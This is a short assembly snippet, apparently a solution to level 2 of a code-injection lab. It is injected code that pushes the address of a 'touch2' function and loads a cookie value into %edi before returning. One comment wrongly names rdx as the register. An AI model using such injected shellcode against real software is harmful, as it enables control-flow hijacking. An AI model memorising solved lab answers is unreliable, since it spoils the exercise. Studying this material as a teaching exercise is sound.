# exploit code in level2
    push $0x4017ec              /* push adress of touch2    */
    movl $0x59b997fa, %edi     /* mov cookie to register rdx, the first argument   */
    retq
